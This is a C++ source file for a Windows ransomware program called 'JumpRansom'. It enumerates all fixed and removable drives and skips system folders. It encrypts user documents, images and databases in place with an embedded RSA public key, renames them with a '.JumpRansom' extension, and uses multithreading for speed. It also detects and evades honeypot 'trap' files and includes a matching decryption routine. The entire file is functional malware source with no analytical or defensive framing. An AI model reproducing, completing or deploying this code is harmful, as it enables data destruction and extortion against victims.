
#include <windows.h>
#include <iostream>  
#include <string>  
#include<filesystem>
#include <vector>
#include <fstream>
#include <map>
#include <openssl/rsa.h>
#include<openssl/pem.h >
#include<openssl/applink.c>
#include <assert.h>
#include <cstdlib>
#include<cctype>
#include"resource.h"
#include <direct.h>
#pragma comment(lib,"libssl.lib")
#pragma comment(lib,"libcrypto.lib")

#define MAX_THREADS 5

namespace fs = std::filesystem;

using namespace std;

// structure used for thread func
typedef struct {
    vector<wstring>* pstack;
    HANDLE* phFullSem;
    HANDLE* pEmptySem;
    HANDLE* pListSem;
    HANDLE* PbJobDone;
    bool bJobDone;
    bool bEncrypt;
} ENCRYPT_PARA;


std::string EncodeRSAKeyFile(const std::wstring& strPemFileName, const std::wstring& strFileName)
{
    if (strPemFileName.empty() || strFileName.empty())
    {
        assert(false);
        return "";
    }
    FILE* hPubKeyFile = NULL;
    if (_wfopen_s(&hPubKeyFile, strPemFileName.c_str(), L"rb") || hPubKeyFile == NULL)
    {
        assert(false);
        return "";
    }
    std::string strRet;
    RSA* pRSAPublicKey = RSA_new();
    if (PEM_read_RSA_PUBKEY(hPubKeyFile, &pRSAPublicKey, 0, 0) == NULL)
    {
        assert(false);
        return "";
    }
        
    // Read file in binary into a buffer
    filebuf* pbuf;
    fstream srcfilestr;
    char* buffer;
    size_t srcSize;    
    srcfilestr.open(strFileName, ios::out | ios::binary | ios::in);
    if (!srcfilestr)
    {
        wcout << "fail to open the file" << strFileName << endl;
        return "";
    }
    pbuf = srcfilestr.rdbuf();
    // Get file size
    srcSize = pbuf->pubseekoff(0, ios::end, ios::in);
    if (srcSize > 5000000) {
        return "";
    }
    pbuf->pubseekpos(0, ios::in);    
    buffer = new char[srcSize];
    // Get file content
    pbuf->sgetn(buffer, srcSize);  
    srcfilestr.seekg(0);
    
    // Encrypt File
    wstring strEncryptedFileName = strFileName + L".JumpRansom";    
    // Encrypt 100 bytes at a time
    size_t index = srcSize / 100;
    char *szBuf = new char[100];
    int nLen = RSA_size(pRSAPublicKey);
    char* pEncode = new char[nLen + 1];
    int ret;
    size_t diff;
    size_t pos;
    for (size_t i = 0; i <= index; i++)
    {
        pos = i * 100;
        diff = srcSize - i*100;
        
        if (diff < 100)
        {
            memcpy(szBuf, buffer+pos, diff);
            //srcfilestr.read(szBuf, diff);
            ret = RSA_public_encrypt(diff, (const unsigned char*)szBuf, (unsigned char*)pEncode, pRSAPublicKey, RSA_PKCS1_PADDING);
        }
        else
        {
            memcpy(szBuf, buffer + pos, 100);
            //srcfilestr.read(szBuf, 100);
            ret = RSA_public_encrypt(100, (const unsigned char*)szBuf, (unsigned char*)pEncode, pRSAPublicKey, RSA_PKCS1_PADDING);
        }
     
        if (ret >= 0)
        {
           
            srcfilestr.write(pEncode, ret);
        }
    }
    
    srcfilestr.close();
    delete[]buffer;
    delete[] pEncode;
    RSA_free(pRSAPublicKey);
    fclose(hPubKeyFile);
    int r = _wrename(strFileName.c_str(), strEncryptedFileName.c_str());
    CRYPTO_cleanup_all_ex_data();
    return strRet;
}

std::string DecodeRSAKeyFile(const std::wstring& strPemFileName, const std::wstring& strFileName)
{
    if (strPemFileName.empty() || strFileName.empty())
    {
        assert(false);
        return "";
    }
    FILE* hPriKeyFile = NULL; 
    if (_wfopen_s(&hPriKeyFile, strPemFileName.c_str(), L"rb") || hPriKeyFile == NULL)
    {
        assert(false);
        return "";
    }
    std::string strRet;
    RSA* pRSAPriKey = RSA_new();
   
    if (PEM_read_RSAPrivateKey(hPriKeyFile, &pRSAPriKey, 0, 0) == NULL)
    {
        assert(false);
        return "";
    }
    int nLen = RSA_size(pRSAPriKey);
    char* pDecode = new char[nLen + 1];

    // Open Files and get size

    std::fstream fin;
    fin.open(strFileName, std::fstream::in | std::fstream::out | std::fstream::binary);
    wstring strDecrypedFileName = strFileName.substr(0,strFileName.find_last_of(L'.'));
    std::fstream fout;
    // Use fout for the Decrypted files
    fout.open(strDecrypedFileName, std::fstream::out | std::fstream::binary);
    fin.seekg(0, fin.end);
    size_t srcSize = fin.tellg();
    fin.seekg(0);
    //Decrypt 128 Bytes a time
    size_t index = srcSize / 128;
    char* szBuf = new char[128];
    int ret;
    size_t diff;
    string strData;

    for (size_t i = 0; i <= index; i++)
    {
        diff = srcSize - fin.tellg();

        if (diff < 128)
        {
            fin.read(szBuf, diff);
            strData = szBuf;
            ret = RSA_private_decrypt(diff, (const unsigned char*)strData.c_str(), (unsigned char*)pDecode, pRSAPriKey, RSA_PKCS1_PADDING);
        }
        else
        {
            fin.read(szBuf, 128);
            strData = szBuf;
            ret = RSA_private_decrypt(128, (const unsigned char*)szBuf, (unsigned char*)pDecode, pRSAPriKey, RSA_PKCS1_PADDING);
        }
        if (ret >= 0)
        {
            strRet = std::string((char*)pDecode, ret);
            //Write Decrypted file out
            fout.write(pDecode, ret);
        }
    }
    fin.close();
    fout.close();

    //Remove encrypted files
    _wremove(strFileName.c_str());
    delete[] pDecode;
    RSA_free(pRSAPriKey);
    fclose(hPriKeyFile);
    CRYPTO_cleanup_all_ex_data();
    return strRet;
}

void TrapFileDetect(vector<wstring>& FilesToBeTested)
{
    int size = FilesToBeTested.size();
    map<wstring, int> _map;
    wstring tmp;
    //Determine files with same name but different suffix as TrapFiles
    for (size_t i = 0; i < FilesToBeTested.size(); i++) {
        _map[FilesToBeTested[i]]++;;
    }
    FilesToBeTested.clear();
    map<wstring, int>::iterator iter;
    iter = _map.begin();
    while (iter != _map.end()) {
        if (iter->second > 1)
        {
            FilesToBeTested.push_back(iter->first);
        }
        iter++;
    }
}

DWORD WINAPI ThreadEncryptProc(LPVOID lpParameter)
{
    ENCRYPT_PARA* para = (ENCRYPT_PARA*)lpParameter;
    while (true)
    {
        WaitForSingleObject(*(para->pListSem), INFINITE);
        WaitForSingleObject(*(para->PbJobDone), INFINITE);
        //Determine the job of main process is done or not
        // if it is done,
        //    and if list not empty, keep working
        //    or if list is empty, release sem and wait
        // if it is not done
        //    and if list is not empty, keep working
        //    or if list is empty, release sem and wait


        if (!para->bJobDone)
        {
            // if not done
            if (!para->pstack->empty())
            {
                 if (para->bEncrypt)
                 {
                     EncodeRSAKeyFile(L"pubkey", para->pstack->back());
                     para->pstack->pop_back();
                 }
                 else
                 {
                     DecodeRSAKeyFile(L"privatekey", para->pstack->back());
                     para->pstack->pop_back();
                 }
            }
            ReleaseSemaphore(*(para->pListSem), 1, NULL);
            ReleaseSemaphore(*(para->PbJobDone), 1, NULL);
        }
        else
        {
            if (!para->pstack->empty())
            {
                if (para->bEncrypt)
                {
                    EncodeRSAKeyFile(L"pubkey", para->pstack->back());
                    para->pstack->pop_back();
                }
                else
                {
                    DecodeRSAKeyFile(L"privatekey", para->pstack->back());
                    para->pstack->pop_back();
                }
                ReleaseSemaphore(*(para->pListSem), 1, NULL);
                ReleaseSemaphore(*(para->PbJobDone), 1, NULL);
            }
            else
            {
                ReleaseSemaphore(*(para->pListSem), 1, NULL);
                ReleaseSemaphore(*(para->PbJobDone), 1, NULL);
                return 0L;
            }             
        }
    }
    return 0L;
}
bool Skip(fs::recursive_directory_iterator iter, map<wstring, int> &mutedFiles, map<wstring, int>& suffixlist)
{
    wstring FileName = iter->path().filename().wstring();
    wstring DirName = iter->path().wstring();
    vector<wstring> FilesToBeTested;
    bool isSkip = false;
    wstring Suffix;
    map<wstring, int> suffix_map;

    //Skip Following folders

    if (iter->is_directory())
    {
        isSkip = !(wcscmp(L"Program Files", FileName.c_str())
            && wcscmp(L"Program Files (x86)", FileName.c_str())
            && wcscmp(L"Windows", FileName.c_str())
            && wcscmp(L"ProgramData", FileName.c_str())
            && wcscmp(L"AppData", FileName.c_str())
            && wcscmp(L"$RECYCLE.BIN", FileName.c_str())
            && wcscmp(L"Boot", FileName.c_str())
            && wcscmp(L"$Recycle.Bin", FileName.c_str())
            && wcscmp(L"Recovery", FileName.c_str())
            && wcscmp(L"Downloads", FileName.c_str())
            );
        if (!isSkip)
        {

            //If not above folders, iterate all files under this folder
            for (fs::directory_iterator sub(iter->path().wstring(), fs::directory_options::skip_permission_denied), end; sub != end; ++sub)
            {
                if (sub->is_directory())
                {
                    continue;
                }
                FileName = sub->path().filename().wstring();
                
                
                if (FileName == L"")
                {
                    continue;
                }
                Suffix = FileName.substr(FileName.find_last_of(L".") + 1);
                FileName = FileName.substr(0, FileName.rfind(L"."));

                suffix_map[Suffix]++;

                FilesToBeTested.push_back(FileName);
                //if folders contain more than 8 types of files, and each type has exactly one type of this file, 
                //this folder could be a trap folder, so skip
            }
            if (suffix_map.size() == FilesToBeTested.size() && FilesToBeTested.size() > 8 && suffix_map.size() > 8)
            {
                isSkip = true;
            }
            // Check if there are trap files
            TrapFileDetect(FilesToBeTested);
            while (!FilesToBeTested.empty())
            {
                mutedFiles[FilesToBeTested.back()]++;
                FilesToBeTested.pop_back();
            }
        }
    }
    else
    {
        
        Suffix = FileName.substr(FileName.find_last_of(L".") + 1);
        FileName = FileName.substr(0, FileName.rfind(L"."));
        FilesToBeTested.push_back(FileName);
        //if not file type in the suffix list, skip
        if (suffixlist[Suffix] == 0)
        {
            isSkip = true;
        }
        //TrapFileDetect(FilesToBeTested);
        //while (!FilesToBeTested.empty())
        //{
        //    mutedFiles[FilesToBeTested.back()]++;
        //    FilesToBeTested.pop_back();
        //}

        //if in the trapfile list, skip;
        if (mutedFiles[FileName] != 0)
        {
            isSkip = true;
        }

    }
    return isSkip;
}


void EncryptAll(string drive)
{
    map<wstring,int> mutedFiles;
    wstring FileName;
    wstring DirName;
    vector<wstring>FileStack;
    vector<wstring>suffixlist{ L"sql",L"rtf",L"docx",L"pem",L"jpg",L"txt",L"xlsx",L"mdb",L"doc",L"xls" };
    map<wstring, int> encrypt_map;
    vector<wstring> encrypt_list;
    HANDLE hFullSem = CreateSemaphore(NULL, 0, 1, NULL);
    HANDLE hEmptySem = CreateSemaphore(NULL, 0, 1, NULL);
    HANDLE hListSem = CreateSemaphore(NULL, 1, 1, NULL);
    HANDLE hJobDone = CreateSemaphore(NULL, 1, 1, NULL);
    ENCRYPT_PARA encrypt_para;
    encrypt_para.pEmptySem = &hEmptySem;
    encrypt_para.phFullSem = &hFullSem;
    encrypt_para.pListSem = &hListSem;
    encrypt_para.pstack = &encrypt_list;
    encrypt_para.PbJobDone = &hJobDone;
    encrypt_para.bJobDone = false;
    encrypt_para.bEncrypt = true;    
    HANDLE  hThreadArray[MAX_THREADS];
    

    //Use multithread to encrypt files
    for (size_t i = 0; i < MAX_THREADS; i++)
    {
        hThreadArray[i] = CreateThread(NULL, 0, ThreadEncryptProc, (LPVOID) &encrypt_para, 0, NULL);
    }
    

    //Initialize suffix list, which is used to determine encrypt a file or not. 
    // like only encrypt jpg doc ect.
    for (int i = 0; i < suffixlist.size(); i++)
    {
        encrypt_map.insert({ suffixlist[i], 1 });
    }

    //Iterate files.
   for (fs::recursive_directory_iterator iter(drive, fs::directory_options::skip_permission_denied), end; iter != end; ++iter)
    {


       DirName = iter->path().wstring();
       FileName = iter->path().filename().wstring();
       //If skip and it is a folder, stop recursion
       // if skip and it is a file, continue
       if (Skip(iter,mutedFiles,encrypt_map))
       {
           if (iter->is_directory())
           {
               iter.disable_recursion_pending();
           }
           continue;
       }
       else if(!iter->is_directory())
       {
           if (encrypt_list.size() > 99)
           {
               WaitForSingleObject(hFullSem, INFINITE);
           }
           WaitForSingleObject(hListSem, INFINITE);
           encrypt_list.push_back(DirName);
           ReleaseSemaphore(hListSem, 1, NULL);
           ReleaseSemaphore(hEmptySem,1,NULL);
       } 
    }
   WaitForSingleObject(hJobDone, INFINITE);
   encrypt_para.bJobDone = true;
   ReleaseSemaphore(hJobDone, 1, NULL);
   WaitForMultipleObjects(MAX_THREADS, hThreadArray, TRUE, INFINITE);

   for (int i = 0; i < MAX_THREADS; i++)
   {
       CloseHandle(hThreadArray[i]);
   }
   CloseHandle(hListSem);
   CloseHandle(hFullSem);
   CloseHandle(hEmptySem);
}
void TcharToChar(TCHAR* tchar, char* _char)
{
    int Length;
    Length = WideCharToMultiByte(CP_ACP, 0, tchar, -1, NULL, 0, NULL, NULL);
    WideCharToMultiByte(CP_ACP, 0, tchar, -1, _char, Length, NULL, NULL);
}

void GetDrives(vector<TCHAR*>* drives)
{
    DWORD dwLen = GetLogicalDriveStrings(0, NULL);	
    TCHAR* pszDriver = new TCHAR[dwLen];		    
    GetLogicalDriveStrings(dwLen, pszDriver);		
    vector<TCHAR*> list;
    int count = dwLen;

    while (count >4)
    {        
        list.push_back(pszDriver);
            cout << std::endl;
            pszDriver += 4;        
            count -= 4;
    }

    int DType;
    count = dwLen / 4;

    for (int i = 0; i < list.size(); ++i)
    {
        DType = GetDriveType(list[i]);
        if (DType == 3 || DType ==2)
        {            
            drives->push_back(list[i]);
        }
    }
}


bool releasePubKey()
{
    HRSRC hResID = ::FindResource(NULL, MAKEINTRESOURCE(IDR_PEM2), L"PEM");

    if (hResID == NULL)
    {
        return false;
    }
    DWORD dwSize = SizeofResource(NULL, hResID);
    HGLOBAL hRes = ::LoadResource(NULL, hResID);
    if (hRes == NULL)
    {
        return false;
    }

    LPVOID lpRes = LockResource(hRes);
    if (lpRes == NULL)
    {
        FreeResource(hRes);
        return false;
    }
    HANDLE hFile = CreateFile(L"pubkey", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == NULL)
    {
        UnlockResource(hRes);
        FreeResource(hRes);
        return false;
    }
    DWORD dwWriten = 0;
    BOOL bRes = WriteFile(hFile, lpRes, dwSize, &dwWriten, NULL);
    if (bRes == 0)
    {
        CloseHandle(hFile);
        UnlockResource(hRes);
        FreeResource(hRes);
        return false;
    }
    CloseHandle(hFile);
    UnlockResource(hRes);
    FreeResource(hRes);
    return true;
}

bool releasePrivateKey()
{
    HRSRC hResID = ::FindResource(NULL, MAKEINTRESOURCE(IDR_PEM1), L"PEM");

    if (hResID == NULL)
    {
        return false;
    }
    DWORD dwSize = SizeofResource(NULL, hResID);
    HGLOBAL hRes = ::LoadResource(NULL, hResID);
    if (hRes == NULL)
    {
        return false;
    }

    LPVOID lpRes = LockResource(hRes);
    if (lpRes == NULL)
    {
        FreeResource(hRes);
        return false;
    }
    HANDLE hFile = CreateFile(L"privatekey", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == NULL)
    {
        UnlockResource(hRes);
        FreeResource(hRes);
        return false;
    }
    DWORD dwWriten = 0;
    BOOL bRes = WriteFile(hFile, lpRes, dwSize, &dwWriten, NULL);
    if (bRes == 0)
    {
        CloseHandle(hFile);
        UnlockResource(hRes);
        FreeResource(hRes);
        return false;
    }
    CloseHandle(hFile);
    UnlockResource(hRes);
    FreeResource(hRes);
    return true;
}

bool DecryptAll(std::string drive)
{

    //structure similar to EncryptAll func but has no skip function
    wstring name;
    wstring suffix;
    vector<wstring> decrypt_list;
    HANDLE hFullSem = CreateSemaphore(NULL, 0, 1, NULL);
    HANDLE hEmptySem = CreateSemaphore(NULL, 0, 1, NULL);
    HANDLE hListSem = CreateSemaphore(NULL, 1, 1, NULL);
    HANDLE hJobDone = CreateSemaphore(NULL, 1, 1, NULL);
    ENCRYPT_PARA decrypt_para;
    decrypt_para.pEmptySem = &hEmptySem;
    decrypt_para.phFullSem = &hFullSem;
    decrypt_para.pListSem = &hListSem;
    decrypt_para.pstack = &decrypt_list;
    decrypt_para.PbJobDone = &hJobDone;
    decrypt_para.bJobDone = false;
    decrypt_para.bEncrypt = false;
    HANDLE  hThreadArray[MAX_THREADS];

    bool isSkip;
    wstring FileName;
    for (size_t i = 0; i < MAX_THREADS; i++)
    {
        hThreadArray[i] = CreateThread(NULL, 0, ThreadEncryptProc, (LPVOID)&decrypt_para, 0, NULL);
    }
    for (fs::recursive_directory_iterator iter(drive, fs::directory_options::skip_permission_denied), end; iter != end; ++iter)
    {
        FileName = iter->path().filename().wstring();
        isSkip = !(wcscmp(L"Program Files", FileName.c_str())
            && wcscmp(L"Program Files (x86)", FileName.c_str())
            && wcscmp(L"Windows", FileName.c_str())
            && wcscmp(L"ProgramData", FileName.c_str())
            && wcscmp(L"AppData", FileName.c_str())
            && wcscmp(L"$RECYCLE.BIN", FileName.c_str())
            && wcscmp(L"Boot", FileName.c_str())
            && wcscmp(L"$Recycle.Bin", FileName.c_str())
            && wcscmp(L"Recovery", FileName.c_str())
            && wcscmp(L"Downloads", FileName.c_str())
            );

        if (isSkip)
        {
            if (iter->is_directory())
            {
                iter.disable_recursion_pending();
            }
            continue;
        }
        name = iter->path().filename().wstring();

        suffix = name.substr(name.find_last_of(L".") + 1);
        if (suffix == L"JumpRansom")
        {
            if (decrypt_list.size() > 99)
            {
                WaitForSingleObject(hFullSem, INFINITE);
            }
            WaitForSingleObject(hListSem, INFINITE);
            decrypt_list.push_back(iter->path().wstring());
            ReleaseSemaphore(hListSem, 1, NULL);
            ReleaseSemaphore(hEmptySem, 1, NULL);
        }
    }
    WaitForSingleObject(hJobDone, INFINITE);
    decrypt_para.bJobDone = true;
    ReleaseSemaphore(hJobDone, 1, NULL);
    WaitForMultipleObjects(MAX_THREADS, hThreadArray, TRUE, INFINITE);

    for (int i = 0; i < MAX_THREADS; i++)
    {
        CloseHandle(hThreadArray[i]);
    }

    CloseHandle(hListSem);
    CloseHandle(hFullSem);
    CloseHandle(hEmptySem);
    return true;

}



int main(int argc, char* argv[])
{  
    vector<TCHAR*>* wdrives = new vector<TCHAR*>() ;
    GetDrives(wdrives);
    char* tmp;
    vector<char*>* drives = new vector<char*>();
    
   
    while (!wdrives->empty())
    {
        tmp = new char[5];
        TcharToChar(wdrives->back(), tmp);
        drives->push_back(tmp);
        wdrives->pop_back();
    }
    string drivepath;
    string path = std::filesystem::current_path().string();
    if (argc != 1)
    {
        releasePrivateKey();
        
        for (int i = 0; i < drives->size(); i++) {
            drivepath = drives->at(i);
            DecryptAll(drivepath);
        }
        path += "\\privatekey";
    }
    else
    {
        releasePubKey();
        for (int i = 0; i < drives->size(); i++) {
            drivepath = drives->at(i);
            EncryptAll(drivepath);
        }
        path += "\\pubkey";
    }

    //releasePrivateKey();
    //    releasePubKey();
    //    //EncryptAll("D:\\test\\");
    //    DecryptAll("D:\\test\\");
    //   string pubputh =  path + "\\pubkey";
    //    remove(pubputh.c_str());
    //    path += "\\privatekey";
    remove(path.c_str());

    
    

    return 0;
}
